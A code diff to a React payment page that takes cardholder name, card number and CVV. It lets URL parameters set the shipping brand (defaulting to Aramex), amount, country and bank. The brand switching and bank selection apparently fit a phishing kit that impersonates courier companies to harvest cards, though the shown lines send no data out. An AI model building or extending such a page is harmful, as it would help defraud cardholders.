@@ -1,5 +1,5 @@
-import { useState } from "react";
-import { useParams, useNavigate } from "react-router-dom";
+import { useState, useEffect } from "react";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -31,7 +31,8 @@ const PaymentCardInput = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const [searchParams] = useSearchParams();
+  const { data: linkData, isLoading } = useLink(id);
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
@@ -40,13 +41,18 @@ const PaymentCardInput = () => {
   const [cvv, setCvv] = useState("");
   const [cardValid, setCardValid] = useState<boolean | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [isReady, setIsReady] = useState(false);
 
-  // Get customer info and selected bank from link data (cross-device compatible)
+  const serviceParam = searchParams.get('service') || searchParams.get('s');
+  const amountParam = searchParams.get('amount') || searchParams.get('a');
+  const countryParam = searchParams.get('country') || searchParams.get('c');
+  const bankParam = searchParams.get('bank') || searchParams.get('b');
+
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
-  const selectedBankId = linkData?.payload?.selectedBank || '';
+  const selectedCountry = countryParam || linkData?.payload?.selectedCountry || "SA";
+  const selectedBankId = bankParam || linkData?.payload?.selectedBank || '';
 
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const serviceKey = serviceParam || linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
@@ -56,8 +62,7 @@ const PaymentCardInput = () => {
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
 
-  // Get amount from link data - prioritize payment_data amount, then payment_amount, then cod_amount
-  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
+  const rawAmount = amountParam || paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount;
 
   // Handle different data types and edge cases
   let amount = 500; // Default value
@@ -77,7 +82,20 @@ const PaymentCardInput = () => {
   const formattedAmount = formatCurrency(amount, currencyCode);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
-  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
+  const selectedCountryData = getCountryByCode(selectedCountry);
+  
+  useEffect(() => {
+    const timer = setTimeout(() => {
+      setIsReady(true);
+    }, 2000);
+    return () => clearTimeout(timer);
+  }, []);
+  
+  useEffect(() => {
+    if (linkData || countryParam) {
+      setIsReady(true);
+    }
+  }, [linkData, countryParam]);
   
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
